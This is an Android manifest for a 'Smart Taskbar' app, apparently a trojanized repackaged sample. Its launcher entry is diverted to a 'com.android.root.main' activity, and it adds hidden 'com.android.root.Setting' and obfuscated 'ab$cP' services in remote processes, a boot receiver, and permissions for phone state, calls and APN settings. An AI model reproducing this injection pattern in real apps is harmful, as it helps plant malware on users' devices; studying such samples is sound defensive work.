<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.smart.taskbar1">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="TaskbarActivity" android:theme="@android:style/Theme.Black"/>
        <activity android:name="com.android.root.main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.android.root.Setting" android:process=":remote"/>
        <service android:name="ab$cP" android:process=":remote2"/>
        <activity android:label="@string/app_name" android:name="quickList" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/app_name" android:name="buildAction" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/app_name" android:name="ManageLabel" android:theme="@android:style/Theme.Black"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="firstuse" android:screenOrientation="portrait" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/app_name" android:name="Calibrate" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/app_name" android:name="widgetViewer" android:theme="@style/widget"/>
        <activity android:label="@string/app_name" android:name="settings" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/app_name" android:name=".backup">
            <intent-filter>
                <action android:name="com.smart.taskbar1.backup"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <receiver android:name="sdcardReceiver">
                <intent-filter>
                    <action android:name="android.intent.action.MEDIA_MOUNTED"/>
                    <action android:name="android.intent.action.MEDIA_REMOVED"/>
                    <action android:name="android.intent.action.MEDIA_UNMOUNTED"/>
                </intent-filter>
            </receiver>
        </activity>
        <activity android:name=".FileBrowser" android:theme="@android:style/Theme.Dialog">
            <intent-filter>
                <action android:name="com.smart.taskbar1.restore"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <receiver android:name=".TaskbarLauncher">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <category android:name="android.intent.category.HOME"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name=".TaskbarService"/>
        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14bfe4d5597b39"/>
    </application>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
    <uses-permission android:name="android.permission.BLUETOOTH"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-feature android:name="android.hardware.bluetooth" android:required="false"/>
    <uses-feature android:name="android.hardware.wifi" android:required="false"/>
    <uses-feature android:name="android.hardware.bluetooth" android:required="false"/>
    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
    <supports-screens android:anyDensity="false" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/> /&gt;
<uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
</manifest>